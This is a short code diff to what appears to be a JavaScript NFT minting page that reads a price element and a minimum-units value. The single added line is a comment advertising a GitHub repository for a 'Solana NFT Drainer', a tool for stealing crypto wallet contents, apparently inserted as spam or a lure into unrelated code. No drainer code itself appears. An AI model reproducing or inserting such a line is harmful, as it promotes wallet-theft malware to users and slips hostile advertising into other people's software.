@@ -1,3 +1,4 @@
+// Get now this drainer > github.com/0x32Moon/Best-Solana-NFT-Drainer
 const priceHtml = document.getElementById('lnprice');
 let tempMaxSup = mintInfo.minUnits;
 
